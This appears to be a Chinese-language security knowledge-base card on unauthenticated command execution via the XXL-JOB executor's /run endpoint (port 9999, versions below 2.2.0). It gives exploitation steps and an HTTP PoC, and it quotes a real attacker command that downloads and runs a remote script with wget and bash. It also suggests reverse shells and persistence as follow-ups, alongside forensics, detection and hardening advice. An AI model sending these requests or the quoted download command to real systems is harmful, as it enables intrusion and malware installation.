---
id: web-java-component-xxl-job-executor-unauth-run-glue-rce
title: XXL-JOB executor 9999 未授权命令执行：直接 POST /run 覆盖 GLUE 脚本，gluesource 落盘成为取证点
type: scenario
domain: web
path: web/java/component
technique: xxl-job-executor-unauth-run-glue-rce
aliases:
- xxl-job executor 未授权 RCE
- xxl-job 9999 未授权
- /run GLUE_SHELL
- GLUE(Shell) 命令执行
- xxl-job unacc
- xxl-job accessToken
tags:
- java
- xxl-job
- executor
- rce
- unauthenticated
- glue
- scheduler
- code-audit
- vulhub
cve: []
severity: critical
confidence: high
affected_versions: xxl-job < 2.2.0
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V392
  verified_at: '2026-11-09T11:52:31+08:00'
  notes: 已对照原文全文与全部41图核对：9999 端口为 xxl-job executor（图01/08/21）、原文明确「版本低于2.2.0 存在未授权远程命令执行」故保留 affected_versions=xxl-job < 2.2.0；POST /run 的 jobId=1/demoJobHandler/GLUE_SHELL/glueUpdatetime=1586699003758/glueSource=touch /tmp/hello 与图28一致，响应 {code:200}；gluesource 落盘 1_1586699003758.sh、2_1680778447000.sh 与执行日志 18:55:30 一致（图27/29-31）；直接打 9999 不留 admin 任务记录的取证特征与原文一致。与同产品 Jetty 内存马（后渗透）、IDOR、Hessian admin 入口均不同，dedup related/new 成立。PoC 未对真实目标执行；「jobId 任意值」原文仅复现 jobId=1，属于推测性表述。frontmatter 无 sources/source_url/文章ID。
---

## 一句话结论

XXL-JOB 2.2.0 之前的 executor 在 9999 端口暴露 REST API，默认没有访问控制：攻击者无需登录 admin，直接 `POST /run` 并携带 `glueType=GLUE_SHELL` 与任意 `glueSource` 脚本，executor 就会把脚本写入 GLUE 任务目录并执行，返回 `{"code":200}`；脚本落盘在 `/data/applogs/xxl-job/jobhandler/gluesource/<id>_<时间戳>.sh`，既是 RCE 载荷也是事后取证的时间线证据。

## 原理

- **XXL-JOB 架构**：admin（调度中心，默认 8080）负责任务管理与调度，executor（执行器，默认 9999）通过 REST API 接收调度请求并执行任务。executor 提供的接口包括 `/run`（触发任务）、`/kill`、`/log` 等。
- **未授权根因**：2.2.0 之前 admin 与 executor 之间的调用没有 accessToken 校验，executor 的 9999 端口也不校验来源；任何能访问该端口的人都能调用 `/run`。2.2.0 引入 `xxl.job.accessToken`，配置一致的 token 才允许调用。
- **GLUE 模式**：任务的运行模式包括 BEAN、GLUE(Shell)、GLUE(Groovy) 等。GLUE 模式下脚本正文由 `glueSource` 字段上传，executor 把它写到 `gluesource/<jobId>_<glueUpdatetime>.sh`（或对应语言文件）并交给 Shell 执行；这正是 `/run` 请求体里可被攻击者完全控制的字段。
- **为什么是直接命令执行**：攻击者只要构造合法的 `jobId`/`executorHandler`（示例为 `demoJobHandler`）与 `glueType=GLUE_SHELL`，在 `glueSource` 中写入 `touch /tmp/hello`、`wget .../xx.sh && bash xx.sh` 或反弹 shell，executor 就会以自身运行身份（示例中为 root）执行。响应 `{"code":200}` 表示请求被接受，效果通过落盘文件或执行日志确认。
- **绕过 admin 的取证特征**：走 9999 直接调用时，admin 后台“任务管理/调度日志”不会留下任务记录，但 executor 侧的 gluesource 脚本仍会落盘。示例中 `1_1586699003758.sh` 内容是 `wget -q -O - http://119.29.52.250/xx.sh && /bin/bash xx.sh`，修改时间 18:33:15，与 cron 首次执行时间吻合，证明攻击者直接打了 executor 的 9999 端口，而不是通过 admin 下发任务。
- **另一条入口**：admin 控制台若使用默认口令 `admin/123456` 且对外可达，也可登录后新建 GLUE(Shell) 任务执行命令；该路径会在后台留下任务与调度记录，与直接打 executor 的痕迹不同。
- **与后续持久化的关系**：executor 命令执行后，攻击者常继续用 crontab（`/var/spool/cron/root` 每分钟 wget 脚本）、systemd 服务（bot.service）等维持；executor 只提供初始立足点，排查时要同时检查 9999 暴露面与主机持久化。

## 触发条件

- 目标为 XXL-JOB < 2.2.0（executor 默认无 accessToken），且 executor 的 9999 端口可从攻击者网络访问。
- executor 以高权限运行（示例为 root；官方脚本/容器常见），任务脚本继承该权限。
- 未把 9999 限制在调度中心内网，或 admin 控制台（8080）使用默认口令且对外暴露。
- 攻击者知道或猜测可用的 `executorHandler`（`demoJobHandler` 等默认示例）与任务参数格式。

## 利用步骤

1. 指纹识别：扫描 9999 端口，确认响应/页面为 xxl-job executor（Jetty RPC），结合版本判断是否 < 2.2.0、是否配置 accessToken。
2. 构造 `/run` 请求：`jobId` 用任意现有/任意值，`executorHandler` 用 `demoJobHandler`，`glueType` 为 `GLUE_SHELL`，`glueSource` 写验证命令（如 `touch /tmp/hello`），带 `glueUpdatetime`、`logId` 等字段。
3. 发送请求，观察响应是否为 `{"code":200}`；到目标上确认 `/tmp/hello` 或 gluesource 下脚本内容是否更新。
4. 将 `glueSource` 换成下载并执行挖矿/木马脚本、反弹 shell 或写 crontab/systemd 的命令，完成初始访问与持久化。
5. 清理/取证：检查 `/data/applogs/xxl-job/jobhandler/gluesource/` 下的脚本名称、内容与时间戳，`/opt/xxl-job` 的日志与 jar 版本，结合 nginx access log 中 9999/8080 的访问记录还原攻击时间线。
6. 加固：升级到 ≥2.2.0 并设置一致的 accessToken；9999 仅对调度中心放行；修改 admin 默认口令。

## PoC

```http
POST /run HTTP/1.1
Host: target:9999
Content-Type: application/json

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586699003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/hello",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

```text
响应：{"code":200}
落盘：/data/applogs/xxl-job/jobhandler/gluesource/1_1586699003758.sh
内容：touch /tmp/hello
```

```bash
# 从 gluesource 取证（示例）
ls -al /data/applogs/xxl-job/jobhandler/gluesource/
cat /data/applogs/xxl-job/jobhandler/gluesource/1_1586699003758.sh
```

说明：请求体字段按原文复现截图整理，`jobId`/`executorHandler` 可按目标已有任务调整；未在本机对真实目标执行。

## 变体与关联

- **入口变体**：admin 控制台默认 `admin/123456` 登录后创建 GLUE(Shell) 任务；或利用 admin 侧其他未授权/越权接口下发任务（见 [[web-generic-auth-xxl-job-getjobsbygroup-jobgroup-idor]]、[[web-generic-auth-xxl-job-jobinfo-remove-idor]]）。
- **执行后变体**：拿到 executor 代码执行后植入 Jetty Handler 内存马（见 [[web-java-component-xxl-job-executor-jetty-handler-collection-memshell]]）。
- **持久化关联**：crontab 轮询下载、systemd 伪装服务（bot.service）、LD_PRELOAD/rootkit 隐藏，见挖矿应急与持久化卡。
- **边界**：≥2.2.0 且配置 accessToken、9999 仅内网可达、executor 低权限运行、或 /run 接口被网关拦截时，直接利用失效；默认口令已修改时 admin 入口也失效。

## 检测与防御

- **升级/配置**：升级到 2.2.0+，设置强随机 `xxl.job.accessToken` 并保证 admin/executor 一致；修改 admin 默认口令并限制 8080/9999 暴露面。
- **网络层**：9999 只允许调度中心访问；对外只暴露必要的业务端口；对新增的 9999 访问做告警。
- **检测信号**：executor 收到来源非调度中心的 `/run` 请求；`gluesource` 目录新增脚本或脚本被改写；executor 进程派生 `bash/sh/wget/curl`；admin 后台出现无任务记录的 gluesource 脚本；nginx/防火墙日志出现对 9999 的直接访问。
- **主机层**：检查 crontab、systemd、/tmp、/etc 下异常文件与时间线；对挖矿进程/矿池连接做流量与进程告警。
